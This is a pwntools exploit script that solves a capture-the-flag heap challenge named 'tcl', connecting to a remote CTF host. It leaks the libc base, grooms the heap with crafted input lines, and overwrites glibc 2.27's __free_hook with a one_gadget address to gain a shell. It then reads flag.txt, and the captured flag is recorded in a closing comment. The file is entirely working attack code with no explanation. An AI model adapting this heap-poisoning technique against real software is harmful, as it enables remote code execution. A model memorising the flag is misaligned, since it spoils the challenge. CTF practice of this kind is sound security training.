from pwn import *

exe = ELF("./tcl_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

'''
fgets
'''

script = '''
set follow-fork-mode parent
set resolve-heap-via-heuristic force
b *0x40174F
b *0x4012ED
'''

p = remote("tcl.chal.cyberjousting.com", 1358)
#p = process("./tcl_patched")
#p = gdb.debug("./tcl_patched", gdbscript = script)

libc_base = int(p.recvline(), 16) - libc.symbols['alarm']
print(hex(libc_base))

p_sl(b'#START')
for i in range(8):
    suffix = f"{i}".encode() * 0x87
    p_sl(b'AAA = "' + suffix + b'"')
p_sl(b'#END')

sleep(6)
#debug()

p_sl(b'#START')
payload = b"B" * 0x27 + b' = "' + b'8' * 3 + b'"'
p_sl(payload)
p_sl(b"#END")

sleep(6)
#debug()

p_sl(b'#START')
__free_hook = libc_base + libc.symbols['__free_hook'] - 8
payload = b"C" * 0x27 + b' = "' + p64(__free_hook)[:6:] + b'"'
p_sl(payload)

payload = b"C" * 0x27 + b' = "' + b"Y" * 0x27 + b'"'
p_sl(payload)

one_gadget = libc_base + 0x10a2fc
payload = b"C" * 0x27 + b' = "' + b"A" * 8 + p64(one_gadget)[:6:] + b'"'
p_sl(payload)
p_sl(b"#END")
sleep(5)

p_sl(b"cat flag.txt")

p.interactive()
#byuctf{ok4y_y34h_th4t_d3fin1t3ly_suck3d}